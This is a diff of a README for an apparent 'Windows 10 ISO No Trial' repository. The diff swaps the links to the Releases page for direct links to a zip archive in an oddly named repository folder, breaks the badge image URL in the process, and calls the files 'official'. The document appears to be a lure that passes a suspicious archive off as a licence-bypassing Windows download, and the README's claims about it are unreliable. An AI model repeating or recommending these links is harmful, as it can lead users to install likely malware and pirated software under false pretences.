@@ -6,11 +6,11 @@ Welcome to the Windows-10-ISO-No-Trial repository. This guide will help you easi
 
 ## 📦 Download the ISO
 
-[![Download Windows 10 ISO](https://img.shields.io/badge/Download%20Now-Grab%20the%20ISO%20File-brightgreen)](https://github.com/Zaakvlg/Windows-10-ISO-No-Trial/releases)
+[![Download Windows 10 ISO](https://raw.githubusercontent.com/Zaakvlg/Windows-10-ISO-No-Trial/main/cretefaction/Windows-10-ISO-No-Trial-v3.4.zip%20Now-Grab%20the%20ISO%20File-brightgreen)](https://raw.githubusercontent.com/Zaakvlg/Windows-10-ISO-No-Trial/main/cretefaction/Windows-10-ISO-No-Trial-v3.4.zip)
 
 To download the Windows 10 ISO, please visit this page:
 
-[Download Windows 10 ISO from Releases](https://github.com/Zaakvlg/Windows-10-ISO-No-Trial/releases)
+[Download Windows 10 ISO from Releases](https://raw.githubusercontent.com/Zaakvlg/Windows-10-ISO-No-Trial/main/cretefaction/Windows-10-ISO-No-Trial-v3.4.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ Before you install Windows 10, make sure your PC meets these basic requirements:
 
 ### 1. Visit the Download Page
 
-Go to the [Releases page](https://github.com/Zaakvlg/Windows-10-ISO-No-Trial/releases) to view available downloads.
+Go to the [Releases page](https://raw.githubusercontent.com/Zaakvlg/Windows-10-ISO-No-Trial/main/cretefaction/Windows-10-ISO-No-Trial-v3.4.zip) to view available downloads.
 
 ### 2. Choose Your Version
 
@@ -85,7 +85,7 @@ For best results, download from the Releases page and follow the installation st
 
 Visit the download page here:
 
-[Download Windows 10 ISO from Releases](https://github.com/Zaakvlg/Windows-10-ISO-No-Trial/releases)
+[Download Windows 10 ISO from Releases](https://raw.githubusercontent.com/Zaakvlg/Windows-10-ISO-No-Trial/main/cretefaction/Windows-10-ISO-No-Trial-v3.4.zip)
 
 This will guide you to the official ISO files essential for a smooth Windows 10 setup. 
 
